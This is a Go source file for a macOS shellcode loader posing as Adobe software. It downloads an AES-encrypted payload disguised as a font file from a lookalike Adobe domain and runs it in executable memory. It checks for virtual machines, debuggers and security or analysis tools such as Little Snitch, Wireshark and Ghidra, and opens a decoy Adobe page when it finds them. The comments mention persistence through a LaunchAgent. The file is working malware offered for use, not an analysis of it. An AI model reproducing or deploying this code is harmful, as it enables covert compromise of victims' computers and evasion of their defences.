package main

/*
macOS arm64/amd64 Shellcode Loader
- Remote fetch from CDN (HTTPS, AES-256 encrypted)
- mmap + mprotect for executable memory
- Anti-sandbox checks (VM detection, analysis tools)
- Persistence via LaunchAgent (optional, handled by pkg postinstall)
- Universal binary support (build both archs)

Build arm64:  GOOS=darwin GOARCH=arm64 CGO_ENABLED=1 go build -ldflags="-s -w" -o loader_arm64 loader.go
Build amd64:  GOOS=darwin GOARCH=amd64 CGO_ENABLED=1 go build -ldflags="-s -w" -o loader_amd64 loader.go
Universal:    lipo -create -output AdobeRenderEngine loader_arm64 loader_amd64
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
	"unsafe"
)

/*
#include <sys/mman.h>
#include <string.h>
#include <pthread.h>

// Allocate RW memory, copy shellcode, flip to RX, execute in new thread
int exec_shellcode(void *sc, int sc_len) {
    void *mem = mmap(NULL, sc_len, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_JIT, -1, 0);
    if (mem == MAP_FAILED) {
        // Fallback without MAP_JIT
        mem = mmap(NULL, sc_len, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (mem == MAP_FAILED) return -1;
    }

    memcpy(mem, sc, sc_len);

    // Flip to RX
    if (mprotect(mem, sc_len, PROT_READ | PROT_EXEC) != 0) {
        return -2;
    }

    // Execute in new thread
    pthread_t thread;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

    int ret = pthread_create(&thread, &attr, (void*(*)(void*))mem, NULL);
    pthread_attr_destroy(&attr);

    return ret;
}
*/
import "C"

// Config — replaced at build time
var (
	stagerURL = "https://downloads-adobe.cdn-distribution.services/components/update.woff"
	aesKeyHex = "0000000000000000000000000000000000000000000000000000000000000000"
	aesIVHex  = "00000000000000000000000000000000"
)

// ============================================================
// Sandbox / VM Detection
// ============================================================

func sandboxCheck() bool {
	// 1. CPU count
	if runtime.NumCPU() < 2 {
		return true
	}

	// 2. Check for VM indicators via sysctl
	vmChecks := []struct {
		cmd  string
		args []string
		bad  []string
	}{
		{"sysctl", []string{"-n", "machdep.cpu.brand_string"}, []string{"virtual", "qemu", "kvm"}},
		{"sysctl", []string{"-n", "hw.model"}, []string{"virtual", "vmware", "parallels"}},
		{"system_profiler", []string{"SPHardwareDataType"}, []string{"virtual", "vmware", "parallels", "qemu"}},
	}

	for _, check := range vmChecks {
		out, err := exec.Command(check.cmd, check.args...).Output()
		if err == nil {
			lower := strings.ToLower(string(out))
			for _, indicator := range check.bad {
				if strings.Contains(lower, indicator) {
					return true
				}
			}
		}
	}

	// 3. Check for analysis tools
	analysisTools := []string{
		"wireshark", "charles", "proxyman", "burp",
		"hopper", "ida64", "ghidra", "lldb",
		"dtrace", "instruments", "fsmon",
		"little snitch", "lulu", "blockblock",
		"knockknock", "suspicious package",
	}

	psOut, err := exec.Command("ps", "aux").Output()
	if err == nil {
		lower := strings.ToLower(string(psOut))
		for _, tool := range analysisTools {
			if strings.Contains(lower, tool) {
				return true
			}
		}
	}

	// 4. Sleep timing check
	start := time.Now()
	time.Sleep(2 * time.Second)
	if time.Since(start) < 1500*time.Millisecond {
		return true
	}

	// 5. Check if running in a debugger (ptrace self-check)
	// P_TRACE_DENY_ATTACH would kill us if traced
	out, err := exec.Command("sysctl", "-n", "kern.proc.pid."+fmt.Sprintf("%d", os.Getpid())).Output()
	if err == nil && strings.Contains(string(out), "P_TRACED") {
		return true
	}

	// 6. Check total RAM (< 4GB suspicious for macOS)
	memOut, err := exec.Command("sysctl", "-n", "hw.memsize").Output()
	if err == nil {
		var memBytes uint64
		fmt.Sscanf(strings.TrimSpace(string(memOut)), "%d", &memBytes)
		if memBytes < 4*1024*1024*1024 {
			return true
		}
	}

	return false
}

// ============================================================
// Remote Fetch
// ============================================================

func fetchShellcode(url string) ([]byte, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: false,
			MinVersion:         tls.VersionTLS12,
		},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15")
	req.Header.Set("Accept", "application/font-woff2;q=1.0,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

// ============================================================
// AES Decrypt
// ============================================================

func decryptShellcode(encrypted []byte, keyHex, ivHex string) ([]byte, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return nil, err
	}
	iv, err := hex.DecodeString(ivHex)
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	if len(encrypted) < aes.BlockSize || len(encrypted)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("invalid ciphertext")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(encrypted))
	mode.CryptBlocks(decrypted, encrypted)

	// PKCS7 unpadding
	padLen := int(decrypted[len(decrypted)-1])
	if padLen > aes.BlockSize || padLen == 0 {
		return decrypted, nil
	}
	return decrypted[:len(decrypted)-padLen], nil
}

// ============================================================
// Shellcode Execution
// ============================================================

func executeShellcode(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	ret := C.exec_shellcode(unsafe.Pointer(&shellcode[0]), C.int(len(shellcode)))
	if ret != 0 {
		return fmt.Errorf("exec_shellcode returned %d", ret)
	}
	return nil
}

// ============================================================
// Decoy behavior — open legitimate Adobe page
// ============================================================

func openDecoy() {
	exec.Command("open", "https://acrobat.adobe.com/link/review").Run()
}

// ============================================================
// Main
// ============================================================

func main() {
	// Phase 1: Sandbox detection
	if sandboxCheck() {
		openDecoy()
		os.Exit(0)
	}

	// Phase 2: Fetch encrypted shellcode
	encrypted, err := fetchShellcode(stagerURL)
	if err != nil {
		openDecoy()
		os.Exit(0)
	}

	// Phase 3: Decrypt
	shellcode, err := decryptShellcode(encrypted, aesKeyHex, aesIVHex)
	if err != nil {
		openDecoy()
		os.Exit(0)
	}

	// Phase 4: Execute
	err = executeShellcode(shellcode)
	if err != nil {
		openDecoy()
		os.Exit(0)
	}

	// Keep main thread alive — shellcode runs in background thread
	select {}
}
